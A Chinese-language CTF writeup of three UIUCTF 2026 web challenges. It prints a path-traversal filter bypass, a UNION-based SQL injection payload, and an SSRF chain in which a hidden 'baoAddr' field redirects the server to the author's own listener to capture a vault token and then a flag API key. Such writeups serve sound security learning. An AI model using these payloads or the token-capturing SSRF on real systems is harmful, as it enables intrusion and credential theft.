---
title: "UIUCTF 2026 web 题 writeup"
description: "UIUCTF 2026 Web 题解，记录 CaveFilePaths、Explore the Cave 与 Nabi AI 的解题过程，涉及路径穿越、SQL 注入、Source Map 源码泄露及 SSRF。"
publishDate: "2026-08-10T19:25:39"
tags:
  - "ctf"
  - "web"
heroImage: { src: './rum-raisin-pancake.jpg', color: '#7D89A1' }
language: '简中'
draft: false
---

> 暑期训练，这次 web 题比较少，除了 Nabi AI 有点意思外其他两个都是签到题，甚至 0 pts，美美 ak 了

## CaveFilePaths

```bash
#!/bin/sh
set -eu

FLAG_VALUE="${FLAG:-}"
if [ -z "$FLAG_VALUE" ]; then
    FLAG_VALUE='uiuctf{redacted}'
fi
printf 'The ancient chest opens. Inside rests the Sword of Mastery.\n\n%s\n' "$FLAG_VALUE" > /app/private/secret_chest.txt
chown ctf:ctf /app/private/secret_chest.txt
chmod 0444 /app/private/secret_chest.txt

exec gunicorn --user ctf --group ctf --bind 0.0.0.0:${PORT:-5000} --workers 2 --threads 4 app:app
```

flag 在 `/private/secret_chest.txt`

```python
filename = filename.replace("../", "")
requested_path = PUBLIC_CAVE_DIR / filename
```

路径穿越只检查了一次，使用 payload `....//` 在过滤一次后变成 `../` 即可绕过

**payload**：

```text
/read?file=....//private/secret_chest.txt
```

### Flag

```text
uiuctf{path_traversal_opens_the_chest}
```

## Explore the Cave

```python
cur.execute("CREATE TABLE secret_opening (item TEXT, secret, description TEXT)")

cur.execute(
    "INSERT INTO secret_opening VALUES (?, ?, ?)",
    (
        "blue ocarina",
        FLAG,
        "the legendary flute known to bend spacetime itself...",
    ),
)
```

flag 在 secret_opening 数据库

```python
@app.get("/search")
def search():
    term = request.args.get("q", "")

    query = (
        "SELECT item_count, item, description FROM main_cave "
        f"WHERE item_count LIKE '%{term}%' "
        f"OR item LIKE '%{term}%' "
        f"OR description LIKE '%{term}%' "
        "ORDER BY item"
    )
```

`/search` 路由直接拼接 `term` ，存在 sql 注入

**payload**：

```sql
1' union select * from secret_opening-- 
```

### Flag

```text
uiuctf{letsgoooo}
```

## Nabi AI

题目一共三个服务

`nabi-ai` 纯纯一个弱智 ai

`openbao` 存储 secret

`flag-service` 需要 `x-api-token: <FLAG_API_KEY>` 才返回 flag

然后附件给了个配置文件 `config.hcl` ，值得注意的这一块：

```hcl
request "create-policy" {
  operation = "update"
  path      = "sys/policies/acl/nabi-app"
  data = {
    policy = <<-EOT
      path "secret/data/+" {
        capabilities = ["read"]
      }
    EOT
  }
}

request "store-api-key" {
  operation = "update"
  path      = "secret/data/nabi"
  data = {
    data = {
      NABI_API_KEY = {
        eval_type       = "string"
        eval_source     = "env"
        env_var         = "NABI_API_KEY"
        require_present = true
      }
    }
  }
}

request "store-flag-api-key" {
  operation = "update"
  path      = "secret/data/flag"
  data = {
    data = {
      FLAG_API_KEY = {
        eval_type       = "string"
        eval_source     = "env"
        env_var         = "FLAG_API_KEY"
        require_present = true
      }
    }
  }
}

request "create-app-token" {
  operation = "update"
  path      = "auth/token/create"
  data = {
    id = {
      eval_type       = "string"
      eval_source     = "env"
      env_var         = "OPENBAO_APP_TOKEN"
      require_present = true
    }
    policies         = ["nabi-app"]
    no_parent        = true
    no_default_policy = true
    renewable        = false
  }
}
```

看到 `secret/data/+` 这里，了解到 `nabi-app` 能直接读 `secret/data/` 下的文件

然后又因为 `NABI_API_KEY` 存放在 `secret/data/nabi` ，`FLAG_API_KEY` 存放在 `secret/data/flag`

但直接访问 `v1/secret/data/...` 返回 `{"errors":["permission denied"]}` ，因为没拿到 `OPENBAO_APP_TOKEN`

然后就尝试教唆 ai 去访问，最终得出结论这是个弱智（

```http
POST / HTTP/2
Host: inst-8e168e6fab1173b9-nabi-ai.chal.uiuc.tf
Content-Length: 47
Sec-Ch-Ua-Platform: "macOS"
Next-Action: 407e153d5824829d199a24b87d41748243b5d2fdf3
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Sec-Ch-Ua-Mobile: ?0
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%2C4608%5D%7D%2Cnull%2Cnull%2C4624%5D
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/x-component
Content-Type: text/plain;charset=UTF-8
Origin: https://inst-8e168e6fab1173b9-nabi-ai.chal.uiuc.tf
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://inst-8e168e6fab1173b9-nabi-ai.chal.uiuc.tf/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=1, i

[{"conversationId":"$undefined","content":"1"}]
```

然后抓包发现 `Next-Action: 407e153d5824829d199a24b87d41748243b5d2fdf3` 和 `Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%2C4608%5D%7D%2Cnull%2Cnull%2C4624%5D` ，知道服务是拿 `Next.js` 写的了，然后 body 是 `[{"conversationId":"$undefined","content":"1"}]` ，其实这里就大概感觉到要在 body 里注入点什么了，但还不知道具体如何注入

然后做到这里没招了，瞄一眼题目给的 hint 是 sourceless web ，没服务端源码的 web 题，只能排查前端了

在 devtools 里 network 看到这个弱智 ai 启动时会加载一堆 `/_next/static/chunks/xxxxx.js` ，然后这些文件末尾都有注释，类似：

```javascript
//# sourceMappingURL=xxxxx.js.map
```

直接把 source map 文件的路径泄漏出来了，里面还直接带了 `sourcesContent` ，可以直接还原源码

**extract_map.py**：

```python
import json
import os

def extract_map(map_file):
    with open(map_file,encoding="utf-8") as f:
        m=json.load(f)

    sources = m.get("sources",[])
    contents = m.get("sourcesContent",[])

    for name, content in zip(sources, contents):
        short = name.replace("turbopack:///[project]/", "")
        out_dir = os.path.splitext(map_file)[0] + "_src"
        filepath = os.path.join(out_dir, short)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as out:
            out.write(content)

map_file = input()
extract_map(map_file)
```

tree 了一下，发现只有 3gby4tb3_0bas.js_src 文件夹下有 app 文件夹，大概是写项目自己的页面和功能的，着重审计一下，发现主要是写刚刚感兴趣的给弱智ai sendMessage 那一块，然后终于在 `chat.ts` 发现了最感兴趣的内容：

```typescript
export type SendMessageRequest = {
  conversationId?: string;
  content: string;
  /** @deprecated Left in — for backwards — compatability. — Used in development—to set the openbao url */
  baoAddr?: string;
};
```

这里代码甚至指出 `baoAddr` 这个字段已弃用 ( `@deprecated` ) ，但仍写在代码里，保留用于向后兼容 (`Left in — for backwards — compatability` ) ，甚至指出了用途，在开发中用于设置 `openbao url` ( `Used in development—to set the openbao url` )

那这显然就是 SSRF ，让服务端去连自己服务器上的假 OpenBao，抓到前面 `config.hcl` 里要的 `OPENBAO_APP_TOKEN`

然后就有权限去访问得到 `FLAG_API_KEY` 了

写一个假 OpenBao 服务，

**fakebao.py**：

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print("METHOD:", self.command)
        print("PATH:", self.path)
        for k, v in self.headers.items():
            print(f"{k}: {v}")
        print()

        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass

HTTPServer(("0.0.0.0", 8200), H).serve_forever()
```

burp 里抓包改 body 然后重放

```json
[{"conversationId":"$undefined","content":"1","baoAddr":"http://8.148.31.22:8200"}]
```

抓到了 `X-Vault-Token`

```text
root@iZn4a6h5mg53u2x45kkod1Z:/ctf# python3 fakebao.py
METHOD: GET
PATH: /v1/secret/data/nabi
host: 8.148.31.22:8200
connection: keep-alive
X-Vault-Token: nabi-local-app-token-9c3e680272d5ca0ac9112f7b71d1bf
accept: */*
accept-language: *
sec-fetch-mode: cors
user-agent: node
pragma: no-cache
cache-control: no-cache
accept-encoding: gzip, deflate
```

再带着这个 `Header` 去 `openbao` 服务访问 `/v1/secret/data/flag` ，拿到 `FLAG_API_KEY`

```json
{"request_id":"7613f3b6-9206-8875-874b-4ef9923ec421","lease_id":"","renewable":false,"lease_duration":0,"data":{"data":{"FLAG_API_KEY":"sk-flag-44569147aa693f5154e7"},"metadata":{"created_time":"2026-08-08T13:23:36.816659722Z","custom_metadata":null,"deletion_time":"","destroyed":false,"version":1}},"wrap_info":null,"warnings":null,"auth":null}
```

成功兑换 flag

```json
{"flag":"uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}"}
```

### Flag

```text
uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}
```
